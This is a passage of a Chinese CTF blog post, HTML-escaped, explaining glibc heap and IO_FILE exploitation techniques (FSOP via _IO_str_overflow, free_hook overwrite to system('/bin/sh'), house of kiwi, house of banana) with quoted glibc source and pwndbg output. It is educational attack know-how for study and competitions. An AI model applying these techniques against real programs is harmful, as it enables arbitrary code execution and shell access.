class=&#34;comment&#34;&gt;//Glibc 2.31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_str_finish (_IO_FILE *fp, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dummy)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_IO_buf_base &amp;amp;&amp;amp; !(fp-&amp;gt;_flags &amp;amp; _IO_USER_BUF))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    (((_IO_strfile *) fp)-&amp;gt;_s._free_buffer) (fp-&amp;gt;_IO_buf_base); &lt;span class=&#34;comment&#34;&gt;//我们控制 _free_buffer 为目标函数，就达到了任意执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fp-&amp;gt;_IO_buf_base = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_default_finish (fp, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是在新版本的函数中，将这部分删除了，所以我们无法通过这里 getshell.&lt;/p&gt;
&lt;h4 id=&#34;_io_str_overflow&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_io_str_overflow&#34;&gt;#&lt;/a&gt; _IO_str_overflow&lt;/h4&gt;
&lt;p&gt;2.34 对比之前的版本，这里并没有太大的变化，但是因为没有了 free_hook 事情变得不容乐观&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_str_overflow (FILE *fp, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; flush_only = c == EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_flags &amp;amp; _IO_NO_WRITES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; flush_only ? &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; : EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((fp-&amp;gt;_flags &amp;amp; _IO_TIED_PUT_GET) &amp;amp;&amp;amp; !(fp-&amp;gt;_flags &amp;amp; _IO_CURRENTLY_PUTTING))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      fp-&amp;gt;_flags |= _IO_CURRENTLY_PUTTING;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      fp-&amp;gt;_IO_write_ptr = fp-&amp;gt;_IO_read_ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      fp-&amp;gt;_IO_read_ptr = fp-&amp;gt;_IO_read_end;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pos = fp-&amp;gt;_IO_write_ptr - fp-&amp;gt;_IO_write_base;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (pos &amp;gt;= (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;) (_IO_blen (fp) + flush_only))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_flags &amp;amp; _IO_USER_BUF) &lt;span class=&#34;comment&#34;&gt;/* not allowed to enlarge */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *new_buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *old_buf = fp-&amp;gt;_IO_buf_base;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; old_blen = _IO_blen (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; new_size = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * old_blen + &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (new_size &amp;lt; old_blen)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  new_buf = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt; (new_size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (new_buf == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;comment&#34;&gt;/*	  __ferror(fp) = 1; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (old_buf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt; (new_buf, old_buf, old_blen);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt; (old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;comment&#34;&gt;/* Make sure _IO_setb won&amp;#x27;t try to delete _IO_buf_base. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      fp-&amp;gt;_IO_buf_base = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt; (new_buf + old_blen, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\0&amp;#x27;&lt;/span&gt;, new_size - old_blen);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  _IO_setb (fp, new_buf, new_buf + new_size, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_read_base = new_buf + (fp-&amp;gt;_IO_read_base - old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_read_ptr = new_buf + (fp-&amp;gt;_IO_read_ptr - old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_read_end = new_buf + (fp-&amp;gt;_IO_read_end - old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_write_ptr = new_buf + (fp-&amp;gt;_IO_write_ptr - old_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_write_base = new_buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  fp-&amp;gt;_IO_write_end = fp-&amp;gt;_IO_buf_end;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!flush_only)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *fp-&amp;gt;_IO_write_ptr++ = (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;) c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_IO_read_end)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fp-&amp;gt;_IO_read_end = fp-&amp;gt;_IO_write_ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	2.34 前的版本中，我们在利用 FSOP 劫持_IO_list_all 的值来伪造链表和其中的 IO_FILE 项。&lt;/p&gt;
&lt;p&gt;​	当程序执行 exit 函数，或者从 main 函数返回时，会执行调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。&lt;br&gt;
因而当设置 stdout 对应的_IO_FILE 对应的 vtable 为 _IO_str_jumps&lt;br&gt;
 执行 exit 就会执行，_IO_str_overflow,&lt;/p&gt;
&lt;p&gt;利用思路是根据这里面连续的 malloc,memcpy,free，通过控制、伪造 IO_FILE，我们要伪造一个 fake_chunk, 使得函数调用 malloc 时可以得到 fake_chunk, 然后再 fake_chunk 写入我们的数据（来自_IO_buf_base），一般我们把 free_hook 作为 fake_chunk 进行攻击，(这也是攻击陈工的前提)，将 free_hook 覆盖为 system, 执行 system (&amp;quot;/bin/sh&amp;quot;). 这里我们布置的时 fake_chunk 的用户区域为 free_hook-0x10, 这样，_IO_buf_base 的前 8 字节为”/bin/sh\x00“, 接下来的 8 字节时 system 的地址，这样 free (fake_chunk) ===&amp;gt;system (fakechunk), 完成了 free_hook 的覆盖以及 getshell。&lt;/p&gt;
&lt;h4 id=&#34;house-of-kiwi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#house-of-kiwi&#34;&gt;#&lt;/a&gt; house of kiwi&lt;/h4&gt;
&lt;p&gt;当程序没有显示调用 exit，也不会通过主函数返回，那么以往我们使用的 FSOP 就无法进行了，如果此时两个 hook 也没法利用，我们需要一种能够稳定触发 IO 中函数的路径，这就是 house of kiwi, 它利用了__malloc_assert.&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__malloc_assert (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *assertion, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *file, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; line,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		 &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *function)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;) __fxprintf (&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;%s%s%s:%u: %s%sAssertion `%s&amp;#x27; failed.\n&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		     __progname, __progname[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ? &lt;span class=&#34;string&#34;&gt;&amp;quot;: &amp;quot;&lt;/span&gt; : &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		     file, line,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		     function ? function : &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, function ? &lt;span class=&#34;string&#34;&gt;&amp;quot;: &amp;quot;&lt;/span&gt; : &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		     assertion);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fflush (&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;abort&lt;/span&gt; ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从源码中可以看到这个断言中调用了 fflush (stderr)，这个函数会稳定的调用_IO_file_jumps 中的 sync&lt;br&gt;
 在 house of kiwi 中，如果我们能实现一个任意地址写，那么就可以修改 sync 指针，并且在调用的时候还发现，rdx 也很稳定的是 IO_helper_jumps，此时如果我们通过任意地址写将 sync 指针改成 IO_helper_jumps，且将 IO_helper_jumps+0xa0 和 IO_helper_jumps+0xa8 改写，就可以实现栈迁移 orw。在更新的版本中，相关的虚表已经不可以写了。&lt;/p&gt;
&lt;h4 id=&#34;小结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#小结&#34;&gt;#&lt;/a&gt; 小结：&lt;/h4&gt;
&lt;p&gt;但是这些 2.34 更新的版本中（比如 glibcubuntu3.2）下都失效了，因为没有了 free_hook，也就没有了上述的一系列手法，而且以上依赖 fflush () 函数，通常我们需要利用 exit 函数来执行该调用。到此我们宣告上述利用手法，失效。但是比赛目前还没有变态到这种程度，常见的还是 2.34 的早期版本上述手法部分依旧可以实现。&lt;/p&gt;
&lt;h2 id=&#34;解决方案&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解决方案&#34;&gt;#&lt;/a&gt; 解决方案&lt;/h2&gt;
&lt;p&gt;难道 pwn 到此就结束了吗？我们回头梳理下，以上攻击方式失败的原因，无外乎就是没有了 hook 函数以及 vtable 不可写。但是我们回到最开始学习 pwn，其实最简单的还是 rop, 在高版本中我们是否可以结合 stack 与 heap 的攻击？或者我们是否还有其他的办法劫持程序的控制流？&lt;/p&gt;
&lt;h3 id=&#34;house-of-banana&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#house-of-banana&#34;&gt;#&lt;/a&gt; house of banana&lt;/h3&gt;
&lt;p&gt;house of banana 是 ha1vk 师傅在 2020 年总结出来的利用链。不同于_IO_IO_str   和_overflow,_IO_str_overflow。banana 攻击的是 rtld_global 结构体中的 link_map 指针，&lt;/p&gt;
&lt;p&gt;攻击的位置 houm 是在程序结束后调用 exit，或者程序由 libc_start_main 启动，并且主函数可以正常结束返回。（这里提到了 exit，不得不提一下以往的攻击 exit_hook，配合 onegadget 获得 shell，目前为止，到 glibc2.34ubuntu3 依旧可以利用，但是在 3.2 版本下该地址没有了可写权限，所以失效了）&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//2.34 0ubuntu3.2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RAX  &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RBX  &lt;span class=&#34;number&#34;&gt;0x7ffff7fad9f8&lt;/span&gt; (__elf_set___libc_atexit_element__IO_cleanup__) —▸ &lt;span class=&#34;number&#34;&gt;0x7ffff7e26b10&lt;/span&gt; (_IO_cleanup) ◂— endbr64 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RCX  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDX  &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDI  &lt;span class=&#34;number&#34;&gt;0x555555558148&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7ffff7ddd58f&lt;/span&gt; &amp;lt;__run_exit_handlers+&lt;span class=&#34;number&#34;&gt;431&lt;/span&gt;&amp;gt;    nop    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► &lt;span class=&#34;number&#34;&gt;0x7ffff7ddd590&lt;/span&gt; &amp;lt;__run_exit_handlers+&lt;span class=&#34;number&#34;&gt;432&lt;/span&gt;&amp;gt;    call   qword ptr [rbx]               &amp;lt;_IO_cleanup&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rdi: &lt;span class=&#34;number&#34;&gt;0x555555558148&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rsi: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rdx: &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rcx: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; vmmap &lt;span class=&#34;number&#34;&gt;0x7ffff7fad9f8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;number&#34;&gt;0x7ffff7fad000&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;0x7ffff7fb1000&lt;/span&gt; r--p     &lt;span 